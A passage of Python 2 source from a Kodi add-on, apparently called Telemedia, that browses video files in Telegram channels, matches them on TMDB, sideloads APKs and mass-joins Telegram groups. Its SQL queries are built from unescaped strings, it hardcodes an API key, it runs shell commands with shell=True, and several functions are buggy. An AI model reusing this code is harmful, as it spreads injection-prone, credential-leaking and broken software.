        showText('Errors', '\n'.join(error_list))
    xbmcgui.Dialog().ok('All Done','Restart Kodi')
def add_tv_to_db(name,url,data,iconimage,fanart,description):
    #Add tv show
    #Add
    logging.warning('id:'+url)
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""year TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'custom_show')
    dbcon.commit()
    ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32050),(Addon.getLocalizedString(32051)+' ?%s'%name.decode('utf8')))
    if ok:
        dbcur.execute("SELECT * FROM custom_show where tmdb='%s'"%(url))
        match = dbcur.fetchall()
        logging.warning(match)
        
        if len(match)==0:
          dbcur.execute("INSERT INTO custom_show Values ('%s','%s','%s','%s','%s','%s','%s');" %  (name.replace("'","%27"),url,data,iconimage,fanart,description.replace("'","%27"),''))
          dbcon.commit()
          #Added
          xbmcgui.Dialog().ok('Telemedia',name.decode('utf8')+' '+Addon.getLocalizedString(32054))
        else:
           #Error occurred
           #Already Listed
           xbmcgui.Dialog().ok(Addon.getLocalizedString(32052),Addon.getLocalizedString(32053))
    dbcur.close()
    dbcon.close()
def my_local_tv():
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""year TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'custom_show')
    dbcon.commit()
    
    dbcur.execute("SELECT * FROM custom_show")
    match = dbcur.fetchall()
    all_d=[]
    for name,url,data,iconimage,fanart,description,free in match:
        
        aa=addDir3(name.replace("%27","'"),url,16,iconimage,fanart,description.replace("%27","'"),id=url,heb_name=name)
        all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
    dbcur.close()
    dbcon.close()
def remove_my_tv(name,url):
    #Remove
    ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32066),(Addon.getLocalizedString(32064)+' %s?'%name.decode('utf8')))
    if ok:
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""year TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'custom_show')
        dbcon.commit()
        
        dbcur.execute("DELETE  FROM custom_show where tmdb='%s'"%url)
        dbcon.commit()
        
        
        xbmcgui.Dialog().ok('Telemedia',name + ' '+Addon.getLocalizedString(32065))
        xbmc.executebuiltin('Container.Refresh')
        
        dbcur.close()
        dbcon.close()
        
def pre_searches(url,data,last_id,description,iconimage,fanart):
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""free TEXT);" % 'search')
    dbcon.commit()
        
    dbcur.execute("SELECT * FROM search")
    match_search = dbcur.fetchall()
    all_d=[]
    for nm,fr in match_search:
        aa=addDir3(nm,url,6,iconimage,fanart,nm,last_id='0$$$0',data='all')
        all_d.append(aa)
        
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
    addNolink( '[COLOR lightgreen]%s[/COLOR]'%Addon.getLocalizedString(32093), 'www',37,False,fan="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/056c5ee1-35c4-4088-bd42-056e3d29a49f/d6r6rsf-a10be578-9677-4191-89f7-94421bec6656.jpg/v1/fill/w_1024,h_578,q_75,strp/gravity_clean_wallpaper_by_iiigerardoiii_d6r6rsf-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NTc4IiwicGF0aCI6IlwvZlwvMDU2YzVlZTEtMzVjNC00MDg4LWJkNDItMDU2ZTNkMjlhNDlmXC9kNnI2cnNmLWExMGJlNTc4LTk2NzctNDE5MS04OWY3LTk0NDIxYmVjNjY1Ni5qcGciLCJ3aWR0aCI6Ijw9MTAyNCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.6h7jn2BgO8JqvQjFL8g9xCNS3d4fWyaQgEVo0NUv794", iconimage="https://15logo.net/wp-content/uploads/2017/03/Clean-Home-800x800.jpg")
        
    dbcur.close()
    dbcon.close()
def clean_name2(name,original_title,html_g,icon_pre,fan_pre):
    #from resources.modules import PTN
    if '@' in name and '.' in name:
        nm=name.split('.')
        ind=0
        for items in nm:
            if '@' in items:
                nm.pop(ind)
            ind+=1
        name='.'.join(nm)
 

    name=name.replace(' ','.').replace('_','.').replace('-','.').replace('%20',' ').replace('5.1','').replace('AAC','').replace('2CH','').replace('.mp4','').replace('.avi','').replace('.mkv','').replace(original_title,'').replace('מדובב','').replace('גוזלן','').replace('BDRip','').replace('BRRip','')

    name=name.replace('1080p','').replace('720p','').replace('480p','').replace('360p','').replace('BluRay','').replace('ח1','').replace('ח2','').replace('נתי.מדיה','').replace('נ.מ.','').replace('..','.').replace('.',' ').replace('WEB-DL','').replace('WEB DL','').replace('נ מדיה','')

    name=name.replace('HDTV','').replace('DVDRip','').replace('WEBRip','')

    name=name.replace('דב סרטים','').replace('לולו סרטים','').replace('דב ס','').replace('()','').replace('חן סרטים','').replace('ק סרטים','').replace('חננאל סרטים','').replace('יוסי סרטים','').replace('נריה סרטים','').replace('HebDub','').replace('NF','').replace('HDCAM','').replace('@yosichen','')

    name=name.replace('BIuRay','').replace('x264','').replace('Hebdub','').replace('XviD','')

    name=name.replace('Silver007','').replace('Etamar','').replace('iSrael','').replace('DVDsot','').replace('אלי ה סרטים','').replace('PCD1','').replace('PCD2','').replace('CD1','').replace('CD2','').replace('CD3','').replace('Gramovies','').replace('BORip','').replace('200P','').replace('מס1','1').replace('מס2','2').replace('מס3','3').replace('מס4','4').replace('מס 3','3').replace('מס 2','2').replace('מס 1','1')

    name=name.replace('900p','').replace('PDTV','').replace('VHSRip','').replace('UPLOAD','').replace('TVRip','').replace('Heb Dub','').replace('MP3','').replace('AC3','').replace('SMG','').replace('Rip','').replace('6CH','').replace('XVID','')

    name=name.replace('HD','').replace('WEBDL','').replace('DVDrip','')

    #info=(PTN.parse(name))
    regex='.*([1-3][0-9]{3})'
    year_pre=re.compile(regex).findall(name)
    year=0
    if len(year_pre)>0:
        year=year_pre[0]
     
        name=name.replace(year,'')
    pre_year=year
    if year!=0:
        
        url2='http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&year=%s&language=he&append_to_response=origin_country&page=1'%(name,year)
    else:
        url2='http://api.themoviedb.org/3/search/movie?api_key=34142515d9d23817496eeb4ff1d223d0&query=%s&language=he&append_to_response=origin_country&page=1'%(name)
    logging.warning(url2)
    y=requests.get(url2).json()
    
    
    plot=''
    genere=''
    icon=icon_pre
    fan=fan_pre
    original_name=name
    rating=0
    tmdb=''
    if 'results' in y and len(y['results'])>0:
        res=y['results'][0]
        name=res['title']
        if 'release_date' in res:
           year=str(res['release_date'].split("-")[0])
        if year!=pre_year and len(y['results'])>1:
            for items_in in y['results']:
                if 'release_date' in items_in:
                    year=str(items_in['release_date'].split("-")[0])
                    if year==pre_year:
                        res=items_in
                        name=res['title']
        plot=res['overview']
        genres_list= dict([(i['id'], i['name']) for i in html_g['genres']  if i['name'] is not None])
        try:genere = u' / '.join([genres_list[x] for x in res['genre_ids']])
        except:genere=''
        
        if res['poster_path']==None:
          icon=' '
        else:
           icon='https://image.tmdb.org/t/p/original/'+res['poster_path']
        if 'backdrop_path' in res:
             if res['backdrop_path']==None:
              fan=' '
             else:
              fan='https://image.tmdb.org/t/p/original/'+res['backdrop_path']
        else:
            fan='https://image.tmdb.org/t/p/original/'+html['backdrop_path']
        original_name=res['original_title']
        rating=res['vote_average']
        tmdb=str(res['id'])
    return name,year,plot,genere,icon,fan,original_name,rating,tmdb
def tmdb_world(last_id,icon,fan,chan_id):
    try:
        from resources.modules.tmdb import get_html_g
        from resources.modules import cache
        html_g_tv,html_g_movie=cache.get(get_html_g,72, table='posters_n')
        icon_pre=icon
        showdb=Addon.getSetting("showdb")
        fan_pre=fan
        if icon_pre==None:
            icon_pre=''
        if fan_pre==None:
            fan_pre='' 
        num=random.randint(1,1001)

        s_last=int(Addon.getSetting("num_vip"))
        try:
            last_id=int(last_id)
        except:
            last_id=0
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchChatMessages','chat_id':chan_id, 'query': '','from_message_id':int(last_id),'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':s_last, '@extra': num})
             }
       
       

        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        if 'message' in event:
            LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]אנא המתן...[/COLOR]' % COLOR2)
            if int(chan_id)==KIDS_CHAT_ID2:
                join_type=0
                chant_id='@NatiMediaHebdub'
            elif int(chan_id)==HEBREW_GROUP:
                invite_link="https://t.me/joinchat/AAAAAEH4beTG18SsVmQn0Q"
                join_type=1
                
            elif int(chan_id)==WORLD_GROUP:
                join_type=1
                invite_link="https://t.me/joinchat/AAAAADumPH7RARDHtG0SoA"
            elif int(chan_id)==NATIO_NAL:
                join_type=2
                chant_id="@Nature_Films"
            elif int(chan_id)==DOCU:
                join_type=3
                chant_id="@Docuy"
            elif int(chan_id)==TVSHOW:
                join_type=1
                invite_link="https://telegram.me/joinchat/AAAAAEB-codSLnVIPtovVQ"
            elif int(chan_id)==KIDS:
                join_type=5
                chant_id='@mediachildren'
            elif int(chan_id)==KIDS2:
                join_type=6
                chant_id="@disney_plus_group"
            elif int(chan_id)==KIDS3:
                join_type=7
                chant_id="@Disney_plus_il"
            elif int(chan_id)==WAR:
                join_type=8
                chant_id="@shalom_sratim_WW_2"
            elif int(chan_id)==WORLD_GROUP2:
                join_type=9
                chant_id="@KOL_SERETV"
            elif int(chan_id)==HEBREWTV:
                join_type=1
                invite_link="https://t.me/joinchat/AAAAAEcrExn4e7Za2M5MKg"
                
                
                
                
                
            num=random.randint(1,1001)
            if 1:#'Chat not found' in event['message']:
                if join_type==1:
                    # LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]יש להתחבר לטלמדיה[/COLOR]' % COLOR2)
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': invite_link, '@extra': num})
                     }
                if join_type==0:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@kidsworldglobal', '@extra': num})
                     }
                if join_type==9:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@KOL_SERETV', '@extra': num})
                     }
                if join_type==2:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Nature_Films', '@extra': num})
                     }
                if join_type==3:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Docuy', '@extra': num})
                     }
                if join_type==4:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Sdarot_TV', '@extra': num})
                     }
                if join_type==5:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@mediachildren', '@extra': num})
                     }

                if join_type==6:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@Disney_plus_il', '@extra': num})
                     }
                if join_type==7:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@disney_plus_group', '@extra': num})
                     }
                if join_type==8:
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchPublicChat', 'username': '@shalom_sratim_WW_2', '@extra': num})
                     }

                     
                     
                     
                     
                     
                     
                     
                     
                    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                    data={'type':'td_send',
                     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
                     }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                logging.warning('n itmes2')
                logging.warning(event)
        
                data={'type':'td_send',
                     'info':json.dumps({'@type': 'searchChatMessages','chat_id':chan_id, 'query': '','from_message_id':int(last_id),'offset':0,'filter':{'@type': 'searchMessagesFilterDocument'},'limit':s_last, '@extra': num})
                     }
               
               

                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        dp = xbmcgui . DialogProgress ( )
        if showdb == 'true':
         dp.create(Addon.getLocalizedString(32041)+'...',Addon.getLocalizedString(32040), '','')
        zzz=0
        for items in event['messages']:  
            logging.warning('n itmes')
            logging.warning(items)
           
            if 'document' in items['content']:
                
                name=items['content']['document']['file_name']
                
                
                if '.mkv' not in name and '.mp4' not in name and '.avi' not in name:
                        continue
                #if 'מדובב' not in name and 'hebdub' not in name.lower() and chan_id==str(KIDS_CHAT_ID) :
                #    continue
                size=items['content']['document']['document']['size']
                f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                
                if 'date' in items:
                    da=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(items['date']))
               
                mode=3
                if showdb == 'true':
                 if dp.iscanceled():
                    break
                o_name=name
                icon=icon_pre
                fan=fan_pre
                name,year,plot,genere,icon,fan,original_name,rating,tmdb=cache.get(clean_name2,999,name,original_title,html_g_movie,icon_pre,fan_pre, table='posters_n')
                #name,year,plot,genere,icon,fan,original_name,rating=clean_name2(name,original_title,html_g_movie,icon_pre,fan_pre)
                
                if showdb == 'true':
                 dp.update(int(((zzz* 100.0)/(len(event['messages']))) ), Addon.getLocalizedString(32041)+'...','Adding', name )
                zzz+=1
                link_data={}
                link_data['id']=str(items['content']['document']['document']['id'])
                link_data['m_id']=items['id']
                link_data['c_id']=items['chat_id']
                f_lk=json.dumps(link_data)
                addLink( name,f_lk,3,False, icon,fan,'[COLOR blue]'+o_name+'[/COLOR]\n'+f_size2+'\n'+plot,da=da,year=year,original_title=original_name,generes=genere,rating=rating,tmdb=tmdb)
        all_d=[]
        last_id=str(items['id'])
        aa=addDir3('[COLOR yellow]'+Addon.getLocalizedString(32026)+'[/COLOR]','www',31,icon_pre,fan_pre,Addon.getLocalizedString(32026),data=chan_id,last_id=last_id)
        all_d.append(aa) 
        f_last_id='0$$$0$$$0$$$0'
        #'Search'
        aa=addDir3('[COLOR khaki]'+Addon.getLocalizedString(32027)+'[/COLOR]',str(chan_id),2,'https://sitechecker.pro/wp-content/uploads/2017/12/search-engines.png','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','search',data='0',last_id=f_last_id,image_master=icon_pre+'$$$'+fan_pre)
        all_d.append(aa)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
    except:pass
def launch_command(command_launch):
    import subprocess
    try:
        logging.warning('[%s] %s' % ('LAUNCHING SUBPROCESS:', command_launch))
        external_command = subprocess.call(command_launch, shell = True, executable = '/system/bin/sh')
    except Exception, e:
        try:
            logging.warning('[%s] %s' % ('ERROR LAUNCHING COMMAND !!!', e.message, external_command))
            logging.warning('[%s] %s' % ('LAUNCHING OS:', command_launch))
            external_command = os.system(command_launch)
        except:
            logging.warning('[%s]' % ('ERROR LAUNCHING COMMAND !!!', external_command))


def install_apk(name,url):

    try:
        num=random.randint(0,60000)
        #Install
        
        ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32033),(Addon.getLocalizedString(32033)+' %s?'%name))
        if ok:
            mv_name=os.path.join(addon_path,name)
            logging.warning('Downloading addon')
            addon=download_photo(url,num,name,mv_name)
            logging.warning('addon')
            logging.warning(addon)
            # We assume that you have already downloaded the apk you want in /sdcard/Download
            try:
                shutil.move(addon,'/sdcard/Download/application.apk')
            except Exception as e:
                logging.warning('File copy err:'+str(e))
                pass
            #pathdownload = '/sdcard/Download/application.apk'
            #command = 'pm install -rgd ' + pathdownload
            #launch_command(command)
            
            #pathdownload = '/sdcard/Download/application.apk'
            #command = 'pm install -rgd ' + addon
            #launch_command(command)
            #xbmc.executebuiltin('StartAndroidActivity(%s,,,"content://%s")'%(FMANAGER,addon))
            #xbmc.executebuiltin('StartAndroidActivity("","android.intent.action.INSTALL_PACKAGE ","application/vnd.android.package-archive","content://%s")'%addon)
            xbmc.executebuiltin('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+addon+'")')
            xbmcgui.Dialog().ok('Error occurred','Done 1.3.2c')
    except Exception as e:
        xbmcgui.Dialog().ok('Error occurred','Err:'+str(e))
#def full_data_groups():
def add_to_f_d_groups(url,name,data,iconimage,fanart,description):
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""id TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'my_fd_groups')
        dbcon.commit()
        dbcur.execute("SELECT * FROM my_fd_groups where id='%s'"%(url))
        
        match = dbcur.fetchall()
        if len(match)==0:
            dbcur.execute("INSERT INTO my_fd_groups Values ('%s','%s','%s','%s','%s','%s');" %  (name.replace("'","%27"),url,iconimage,fanart,description.replace("'","%27"),' '))
            dbcon.commit()
        else:
            xbmcgui.Dialog().ok('Error occurred',Addon.getLocalizedString(32081))
        #Added
        xbmcgui.Dialog().ok('Telemedia',name.decode('utf8')+' '+Addon.getLocalizedString(32054))
        dbcur.close()
        dbcon.close()
def full_data_groups():
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""id TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'my_fd_groups')
        dbcon.commit()
        dbcur.execute("SELECT * FROM my_fd_groups")
        
        match = dbcur.fetchall()
        all_d=[]
        for name,id,icon,fan,plot,free in match:
            aa=addDir3(name.replace('%27',"'"),id,31,icon,fan,plot.replace('%27',"'"),data=id,remove_from_fd_g=True)
            all_d.append(aa)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
        dbcur.close()
        dbcon.close()
def remove_f_d_groups(url,name):
    ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32082),'?%s'%name+(Addon.getLocalizedString(32082)))
    if ok:
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""id TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'my_fd_groups')
        dbcon.commit()
        dbcur.execute("DELETE  FROM my_fd_groups where id='%s'"%url)
        logging.warning(url)
        dbcon.commit()
        
        
        xbmcgui.Dialog().ok('Telemedia',name + ' '+Addon.getLocalizedString(32065))
        xbmc.executebuiltin('Container.Refresh')
        
        dbcur.close()
        dbcon.close()
def download_files(name,url):

    try:
        num=random.randint(0,60000)
        #Install
        new_dest=xbmc.translatePath(Addon.getSetting("remote_path"))
        logging.warning('new_dest:'+new_dest)
        if not os.path.exists(new_dest):
            xbmcgui.Dialog().ok('Error occurred',Addon.getLocalizedString(32089))
            Addon.openSettings()
            return 0
        ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32088),(Addon.getLocalizedString(32088)+' %s?'%name))
        if ok:
            mv_name=os.path.join(new_dest,name)
            logging.warning('Downloading addon')
            addon=download_photo(url,num,name,mv_name)
            logging.warning('addon')
            logging.warning(addon)
            
        xbmcgui.Dialog().ok('Error occurred','Err:'+str(e))
    except Exception as e:
        xbmcgui.Dialog().ok(Addon.getLocalizedString(32090),Addon.getLocalizedString(32090))
def clear_search_h():
    ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32093),Addon.getLocalizedString(32094))
    if ok:
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""free TEXT);" % 'search')
        dbcon.commit()
            
        dbcur.execute("DELETE FROM search")
        dbcon.commit()
        xbmc.executebuiltin('Container.Refresh')
        dbcur.close()
        dbcon.close()

def groups_joinplus(id,icon_pre,fan_pre):
    num=random.randint(1,1001)
    #repo
    idx=-1001497669388
    #all groups
    idz=-1001416235520
    
    data={'type':'td_send',
         'info':json.dumps({'@type': 'getChatHistory','chat_id':idz,'from_message_id':0,'offset':0,'offset':0,'limit':100,'only_local':True, '@extra':num})
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning(json.dumps(event))
    all_d=[]
    all_l=[]
    counter_ph=num
    complete_list={}
    complete_list['by_link']=[]
    complete_list['public']=[]
    
    for msg in event['messages']:
        msg_in=msg['content']
        
        icon=icon_pre
        fan=fan_pre
        if 'web_page' in msg_in:
            title=msg_in['web_page']['title']
            
            if 'photo' in msg_in['web_page']:
                counter_ph+=1
                icon_id=msg_in['web_page']['photo']['sizes'][0]['photo']['id']
                f_name=msg_in['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                mv_name=os.path.join(icons_path,f_name)
                if os.path.exists(mv_name):
                    icon=mv_name
                else:
                   icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                
                counter_ph+=1
                loc=msg_in['web_page']['photo']['sizes']
                icon_id=msg_in['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                f_name=msg_in['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                mv_name=os.path.join(fan_path,f_name)
                if os.path.exists(mv_name):
                    fan=mv_name
                else:
                   fan=download_photo(icon_id,counter_ph,f_name,mv_name)
            all_l=[]
            all_urls={}
            regex='https://t.me/joinchat/(.+?)\n'
            all_l=re.compile(regex,re.DOTALL).findall(msg_in['web_page']['description'])
            if 'text' in msg_in:
                all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            
            
            if len(all_l)>0:
                all_urls['by_link']='$$$'.join(all_l)
            
            complete_list['by_link']+=all_l
            all_l=[]
            regex='@(.+?)(?: |\n|-)'
            all_l=re.compile(regex,re.DOTALL).findall(msg_in['web_page']['description'])
            if 'text' in msg_in:
                all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                regex='https://t.me/(.+?)(?:/|\n)'
            
                all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            if len(all_l)>0:
                all_urls['public']='$$$'.join(all_l)
            complete_list['public']+=all_l
            # aa=addDir3(title,json.dumps(all_urls),39,icon,fan,msg_in['web_page']['description'])
            # all_d.append(aa)
        else:
            all_l=[]
            all_urls={}
            regex='https://t.me/joinchat/(.+?)\n'
            if 'text' in msg_in:
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            
            if 'text' in msg_in:
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
            
            if len(all_l)>0:
                all_urls['by_link']='$$$'.join(all_l)
            complete_list['by_link']+=all_l
            all_l=[]
            regex='@(.+?)(?: |\n|-)'
           
            if 'text' in msg_in:
                all_l=re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                regex='https://t.me/(.+?)(?:/|\n)'
                if 'text' in msg_in:
                    all_l=all_l+re.compile(regex,re.DOTALL).findall(msg_in['text']['text'])
                
                if len(all_l)>0:
                    all_urls['public']='$$$'.join(all_l)
                else:
                    all_urls['public']=''.join(all_l)
                complete_list['public']+=all_l
                # aa=addDir3(msg_in['text']['text'],json.dumps(all_urls),39,icon,fan,msg_in['text']['text'])
                # all_d.append(aa)
    
    # aa=addDir3('[COLOR lightgreen]'+Addon.getLocalizedString(32105)+'[/COLOR]',json.dumps(complete_list),42,icon,fan,Addon.getLocalizedString(32106))
    # all_d.append(aa)
    
    num=random.randint(0,60000)
    

    j_complete_list=complete_list
    all_j=[]
    dp = xbmcgui.DialogProgress()
    # dpg = xbmcgui.DialogProgressBG()
    dp.create('[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]מצטרף לערוץ[/COLOR][/B]')
    zzz=0
    # dpg = xbmcgui.DialogProgressBG()
    for j_urls in j_complete_list['public']:
    
      if len(j_urls)>0:
       
        if '$$$' in j_urls:
            all_links=j_urls.split('$$$')
        else:
            all_links=[j_urls]
        if dp.iscanceled():
                    break
        for items in all_links:
            if items=='joinchat':
                continue
            num=random.randint(0,60000)
            
            dp.update(int((zzz*100.0)/len(j_complete_list['public'])),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]%s[/COLOR][/B]'%items +' , %s/%s'%(str(zzz),str(len(j_complete_list['public']))))
            zzz+=1
            data={'type':'td_send',
             'info':json.dumps({'@type': 'searchPublicChat','username':items, '@extra':num})
             }
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            if 'id' in event :
                
             
                data={'type':'td_send',
                     'info':json.dumps({'@type': 'joinChat', 'chat_id': event['id'], '@extra': num})
                     }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                
                if event.get('@type') =='error':
                    if 'Too Many Requests: retry after' in str(event.get('message')):
                        time_to_wait=int(str(event.get('message')).split('Too Many Requests: retry after')[1])

                        while( time_to_wait>0):
                            dp.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]Wait for %s sec[/COLOR][/B]'% str(time_to_wait))
                            time_to_wait-=1
                            time.sleep(1)
                time.sleep(0.1)
               
                
            if dp.iscanceled():
                    break
    for j_urls in j_complete_list['by_link']:
    
      
      if len(j_urls)>0:
       
        by_link_chats=j_urls
        
        if '$$$' in url:
            all_urls=by_link_chats.split('$$$')
        else:
            all_urls=[by_link_chats]
        zzz=0
        for it in all_urls:
          if it!='joinchat':
            if it in all_j:
                continue
            all_j.append(it)
            dp.update(int((zzz*100.0)/len(j_complete_list['by_link'])),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]%s[/COLOR][/B]'%it)
            zzz+=1
            num=random.randint(0,60000)
            data={'type':'td_send',
             'info':json.dumps({'@type': 'checkChatInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
             }
                   
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            if 'chat_id' in event:
                continue
            else:
                logging.warning('Joining:'+'https://t.me/joinchat/'+it)
            data={'type':'td_send',
             'info':json.dumps({'@type': 'joinChatByInviteLink', 'invite_link': 'https://t.me/joinchat/'+it, '@extra': num})
             }
                   
            event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
            
            if event.get('@type') =='error':
                if 'Too Many Requests: retry after' in str(event.get('message')):
                    time_to_wait=int(str(event.get('message')).split('Too Many Requests: retry after')[1])
                    while( time_to_wait>0):
                        dp.update(int((zzz*100.0)/len(j_urls)),'[B][COLOR=green]%s[/COLOR][/B]'%Addon.getLocalizedString(32062), '[B][COLOR=yellow]Wait for %s[/COLOR][/B]'% str(time_to_wait))
                        time_to_wait-=1
                        time.sleep(1)
                        if dp.iscanceled():
                            break
            time.sleep(1)
            if dp.iscanceled():
                    break
        if dp.iscanceled():
                    break

    dp.close()
    
    # sys.exit()
    xbmcgui.Dialog().ok('Telemedia','All Done')
    sys.exit()
    
def groups_joinautostart(id,icon_pre,fan_pre):
    try:
        num=random.randint(1,1001)
        all_d=[]
        #repo
        idx=-1001497669388
        #all groups
        idz=-1001416235520
        all_d=infiniteReceiverbackground(all_d,last_id)
        # data={'type':'td_send',
                 # 'info':json.dumps({'@type': 'getChats','offset_chat_id':idz,'offset_order':idx, 'limit': '100', '@extra': num})
                 # }
        # event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        data={'type':'td_send',
             'info':json.dumps({'@type': 'getChatHistory','chat_id':idz,'from_message_id':0,'offset':0,'offset':0,'limit':100,'only_local':True, '@extra':num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        logging.warning(json.dumps(event))
        all_d=[]
        all_l=[]
        counter_ph=num
        complete_list={}
        complete_list['by_link']=[]
        complete_list['public']=[]
        for msg in event['messages']:
            msg_in=msg['content']
            
            icon=icon_pre
            fan=fan_pre
            if 'web_page' in msg_in:
